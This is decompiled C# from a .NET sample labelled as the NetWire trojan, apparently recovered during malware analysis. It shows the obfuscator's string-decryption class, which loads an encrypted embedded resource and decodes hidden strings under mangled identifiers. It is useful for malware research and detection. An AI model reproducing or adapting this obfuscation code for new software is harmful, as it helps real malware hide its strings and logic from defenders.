// Decompiled with JetBrains decompiler
// Type: #8b.#7b
// Assembly: u1rug, Version=0.0.0.0, Culture=neutral, PublicKeyToken=dbb94034cbd6bbd6
// MVID: C8A082E9-30A2-423A-BCDF-59565BB76FBE
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.NetWire.gen-baba76d578be903c9d78e3d6417636ba6a8069cafe9ccccdfce2bc19b43fc299.exe

using \u00238b;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u00238b
{
  internal sealed class \u00237b
  {
    private static readonly string \u00231b = "0";
    private static readonly string \u00232b = "178";
    private static readonly byte[] \u00233b = (byte[]) null;
    private static readonly Dictionary<int, string> \u0023Bb;
    private static readonly bool \u00234b = false;
    private static readonly int \u00235b = 0;

    public static string \u00236b([In] int obj0)
    {
      obj0 -= \u00237b.\u00235b;
      if (\u00237b.\u00234b)
      {
        string str;
        \u00237b.\u0023Bb.TryGetValue(obj0, out str);
        if (str != null)
          return str;
      }
      int num1 = obj0;
      byte[] numArray1 = \u00237b.\u00233b;
      int index1 = num1;
      int num2 = index1 + 1;
      int num3 = (int) numArray1[index1];
      int num4;
      if ((num3 & 128) == 0)
      {
        num4 = num3;
        if (num4 == 0)
          return string.Empty;
      }
      else if ((num3 & 64) == 0)
      {
        num4 = ((num3 & 63) << 8) + (int) \u00237b.\u00233b[num2++];
      }
      else
      {
        int num5 = (num3 & 31) << 24;
        byte[] numArray2 = \u00237b.\u00233b;
        int index2 = num2;
        int num6 = index2 + 1;
        int num7 = (int) numArray2[index2] << 16;
        int num8 = num5 + num7;
        byte[] numArray3 = \u00237b.\u00233b;
        int index3 = num6;
        int num9 = index3 + 1;
        int num10 = (int) numArray3[index3] << 8;
        int num11 = num8 + num10;
        byte[] numArray4 = \u00237b.\u00233b;
        int index4 = num9;
        num2 = index4 + 1;
        int num12 = (int) numArray4[index4];
        num4 = num11 + num12;
      }
      try
      {
        byte[] numArray5 = \u0008.\u000F(\u0084.\u007E\u008A((object) \u0001.\u0003(), \u00237b.\u00233b, num2, num4));
        string str = \u0015.\u001A(\u0084.\u007E\u008A((object) \u0001.\u0003(), numArray5, 0, numArray5.Length));
        if (\u00237b.\u00234b)
        {
          try
          {
            \u00237b.\u0023Bb.Add(obj0, str);
          }
          catch
          {
          }
        }
        return str;
      }
      catch
      {
        return (string) null;
      }
    }

    static \u00237b()
    {
      if (\u0086.\u008B(\u00237b.\u00231b, "1"))
      {
        \u00237b.\u00234b = true;
        \u00237b.\u0023Bb = new Dictionary<int, string>();
      }
      \u00237b.\u00235b = \u0087.\u008C(\u00237b.\u00232b);
      Assembly assembly = \u0012.\u0016();
      Stream stream = \u0088.\u007E\u008D((object) assembly, "{01559eb2-1f8a-4ae2-b410-c76e9bbd6188}");
      try
      {
        int length = \u008A.\u008F(\u0089.\u007E\u008E((object) stream));
        \u00237b.\u00233b = new byte[length];
        int num = \u008B.\u007E\u0090((object) stream, \u00237b.\u00233b, 0, length);
        \u008C.\u007E\u0091((object) stream);
      }
      finally
      {
        if (stream != null)
          \u008C.\u007E\u0092((object) stream);
      }
    }
  }
}
